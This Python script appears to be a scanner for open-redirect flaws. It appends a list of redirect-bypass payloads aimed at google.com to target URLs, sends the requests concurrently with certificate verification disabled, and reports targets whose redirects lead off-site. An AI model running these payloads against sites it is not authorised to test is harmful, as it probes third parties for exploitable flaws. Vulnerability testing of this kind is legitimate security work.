import requests
requests.packages.urllib3.disable_warnings()

import concurrent.futures
import urllib

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

TEST_DOMAIN = "google.com"

PAYLOADS = [
    f"//{TEST_DOMAIN}",
    f"//www.{TEST_DOMAIN}",
    f"https://{TEST_DOMAIN}",
    f"https://www.{TEST_DOMAIN}",
    f"//{TEST_DOMAIN}/%2f..",
    f"https://{TEST_DOMAIN}/%2f..",
    f"////{TEST_DOMAIN}",
    f"https:////{TEST_DOMAIN}",
    f"/\\/\\{TEST_DOMAIN}",
    f"/.{TEST_DOMAIN}",
    f"///\\;@{TEST_DOMAIN}",
    f"///{TEST_DOMAIN}@{TEST_DOMAIN}",
    f"///{TEST_DOMAIN}%40{TEST_DOMAIN}",
    f"////{TEST_DOMAIN}//",
    f"/https://{TEST_DOMAIN}",
    f"{TEST_DOMAIN}",
]

def test_single_payload(args, url, payload, original_netloc):
    try:
        full_url = f"{url}{payload}"
        response = requests.get(full_url, allow_redirects=False, verify=False, timeout=5)
        if args.verbose:
            print(f"Testing: {full_url}")
            print(f"Status Code: {response.status_code}")
            print(f"Location: {response.headers.get('Location', 'N/A')}")
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '')
            if location:
                parsed_location = urllib.parse.urlparse(location)
                # If 'location' is a relative URL, resolve it against the original URL
                if not parsed_location.netloc:
                    location = urllib.parse.urljoin(full_url, location)
                    parsed_location = urllib.parse.urlparse(location)
                # Now compare the netloc of the location with the original netloc
                if parsed_location.netloc and parsed_location.netloc != original_netloc:
                    # Check if the TEST_DOMAIN is in the netloc
                    if TEST_DOMAIN in parsed_location.netloc:
                        print(f"{RED}VULNERABLE: Redirects to {location}{RESET}")
                        return (full_url, location)
        elif response.status_code == 403:
            print(f"{url}: {RED}FORBIDDEN{RESET}")
    except requests.RequestException as e:
        if args.verbose:
            print(f"Error testing {full_url}: {str(e)}")
    return None

def test_open_redirect(args, url):
    vulnerable_urls = []
    parsed_original_url = urllib.parse.urlparse(url)
    original_netloc = parsed_original_url.netloc
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as executor:
        future_to_payload = {
            executor.submit(test_single_payload, args, url, payload, original_netloc): payload
            for payload in PAYLOADS
        }
        for future in concurrent.futures.as_completed(future_to_payload):
            result = future.result()
            if result:
                vulnerable_urls.append(result)
    return vulnerable_urls

def process_url(args, url):
    print(f"{YELLOW}Testing: {url}{RESET}")
    vulnerabilities = test_open_redirect(args, url)
    if vulnerabilities:
        print(f"{RED}[VULNERABLE] {url}{RESET}")
        for vuln_url, redirect_url in vulnerabilities:
            print(f"  Payload URL: {vuln_url}")
            print(f"  Redirects to: {redirect_url}")
        print()
    else:
        print(f"{GREEN}[NOT VULNERABLE] {url}{RESET}\n")
